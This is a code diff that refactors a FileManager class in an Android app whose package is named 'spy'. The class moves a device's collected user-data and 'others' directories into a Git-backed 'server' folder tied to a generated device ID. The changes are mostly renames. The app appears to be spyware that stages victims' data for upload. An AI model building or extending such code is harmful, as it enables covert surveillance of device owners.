@@ -1,4 +1,4 @@
-package com.gameofcoding.spy.io;
+package com.gameofcoding.spy.server.files;
 
 import android.content.Context;
 import com.gameofcoding.spy.utils.XLog;
@@ -18,25 +18,25 @@ public class FileManager {
     }
 
     public boolean moveDataToServer() {
-	ServerFilePaths serverFilePaths = ServerFilePaths.loadPaths(mContext);
-	DataFilePaths dataFilePaths = DataFilePaths.loadPaths(mContext);
+	ServerFiles serverFiles = ServerFiles.loadFiles(mContext);
+	DataFiles dataFiles = DataFiles.loadFiles(mContext);
 
-	if(serverFilePaths == null) {
+	if(serverFiles == null) {
 	    XLog.e(TAG, "Server dir could not be loaded");
 	    return false;
 	}
 
 	// Clean all previous data present in device dir
-	ServerManager serverMaanager = new ServerManager(serverFilePaths.getRootDir(),
+	ServerManager serverMaanager = new ServerManager(serverFiles.getRootDir(),
 							 new Utils(mContext).generateDeviceId());
 	Server server = null;
 	Server.Directory dirDevice = null;
 	try {
-	    XLog.i(TAG, "Server dir loaded! Cleaning it...");
 	    if((server = serverMaanager.loadServer()) != null) {
+		XLog.i(TAG, "Server dir loaded! Cleaning it...");
 		dirDevice = server.openDir(Server.Dir.DEVICE);
 		if(dirDevice != null) {
-		    cleanServerDir(serverFilePaths);
+		    cleanServerDir(serverFiles);
 		} else {
 		    XLog.w(TAG, "Failed to open device directory in server! Aborting clean...");
 		}
@@ -44,8 +44,8 @@ public class FileManager {
 		XLog.w(TAG, "Aborting clean. Server is null, it should'nt happen.");
 	    }	
 	// Move user data dir
-	File userDataDir = dataFilePaths.getUserDataDir();
-	if(userDataDir.renameTo(new File(serverFilePaths.getRootDir(), userDataDir.getName())))
+	File userDataDir = dataFiles.getUserDataDir();
+	if(userDataDir.renameTo(new File(serverFiles.getRootDir(), userDataDir.getName())))
 	    XLog.i(TAG, "Moved '" + userDataDir + "' to servers root dir.");
 	else {
 	    XLog.e(TAG, "Could not move '" + userDataDir + "' to servers root dir.");
@@ -53,15 +53,15 @@ public class FileManager {
 	}
 
 	// Move others dir
-	File othersDir = dataFilePaths.getOthersDir();
-	if(othersDir.renameTo(new File(serverFilePaths.getRootDir(), othersDir.getName())))
+	File othersDir = dataFiles.getOthersDir();
+	if(othersDir.renameTo(new File(serverFiles.getRootDir(), othersDir.getName())))
 	    XLog.i(TAG, "Moved '" + othersDir + "' to servers root dir.");
 	else {
 	    XLog.e(TAG, "Could not move '" + othersDir + "' to servers root dir.");
 	    return false;
 	}
 	if(dirDevice != null)
-	    dirDevice.saveChanges();
+	    dirDevice.close();
 	else
 	    XLog.w(TAG, "Cannot save changes, device directory is null");
 	} catch(GitAPIException e) {
@@ -70,8 +70,8 @@ public class FileManager {
 	return true;
     }
 
-    private void cleanServerDir(ServerFilePaths serverFilePaths) {
-	File[] files = serverFilePaths.getRootDir().listFiles();
+    private void cleanServerDir(ServerFiles serverFiles) {
+	File[] files = serverFiles.getRootDir().listFiles();
 	for(File file : files) {
 	    if(file.isHidden()) {
 		XLog.i(TAG,
